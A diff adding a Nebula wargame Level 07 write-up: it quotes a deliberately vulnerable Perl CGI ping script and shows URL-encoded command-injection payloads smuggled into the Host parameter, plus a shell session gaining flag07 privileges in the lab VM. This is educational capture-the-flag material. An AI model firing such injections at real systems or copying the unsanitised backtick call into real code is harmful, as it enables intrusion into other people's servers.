@@ -408,3 +408,56 @@ You have successfully executed getflag on a target account
 ## After thought
 1. Avoid to use legacy unix passwd, it is easy to crack. 
 
+
+# Level 07
+## Description
+
+Link [https://exploit.education/nebula/level-07/](https://exploit.education/nebula/level-07/)
+```
+The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
+
+To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.
+```
+
+```perl
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print "Content-type: text/html\n\n";
+
+sub ping {
+  $host = $_[0];
+
+  print("<html><head><title>Ping results</title></head><body><pre>");
+
+  @output = `ping -c 3 $host 2>&1`;
+  foreach $line (@output) { print "$line"; }
+
+  print("</pre></body></html>");
+  
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param("Host"));
+```
+
+## Analyse
+1. In the perl script, the line `ping -c 3 $host 2>&1` is vulnerable, we can run arbitrary code. To tset, try with `http://hostName:7007/index.cgi?Host=localhost%3Btouch%20%2Ftmp%2Ftest%3Becho%202`, then a file named `test` created in `/tmp`
+2. We can use same script from `level03` to create a `exploit` executable.
+
+## Solution
+1. create `exploit.c` and `exploit.sh` as in level03.
+2. enter `http://192.168.111.136:7007/index.cgi?Host=localhost%3B%2Ftmp%2Fexploit.sh%3Becho%202` in browser.
+3. in terminal:
+  ```bash
+  level07@nebula:/home/flag07$ ./exploit 
+  flag07@nebula:/home/flag07$ id
+  uid=992(flag07) gid=1008(level07) groups=992(flag07),1008(level07)
+  flag07@nebula:/home/flag07$ getflag 
+  You have successfully executed getflag on a target account
+  ```
+
+## After thought
+1. Don't trust any user input! Do verification before process user input!
